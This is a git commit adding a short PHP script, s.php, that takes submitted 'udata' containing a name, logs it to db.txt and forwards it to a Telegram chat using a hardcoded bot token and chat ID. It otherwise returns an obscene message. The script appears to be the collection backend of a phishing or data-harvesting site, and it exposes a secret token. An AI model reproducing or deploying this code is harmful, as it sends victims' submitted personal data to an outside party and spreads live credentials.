48517aa1da9050ba71a31fb846d6339da9ca00c7
SeregaSBU11 <fahlae@lary-lcc.click>
2024-07-15 11:46:26 +0300

    Add files via upload

---
+++ s.php
@@ -0,0 +1,13 @@
+$data = json_decode(file_get_contents('php://input'), true);
+$udata = $data['udata'];
+
+if (strpos($udata, 'name') !== false) {
+    file_put_contents('db.txt', $udata . PHP_EOL, FILE_APPEND);
+    
+    $chatId1 = '-1002168499530';
+    $telegramBotToken = '7369875963:AAHHE7CrkuX0E6UErPp2AyOXz2T_iGORye4';
+
+    file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId1&text=" . urlencode($udata));
+} else {
+    echo "suck my dick";
+}
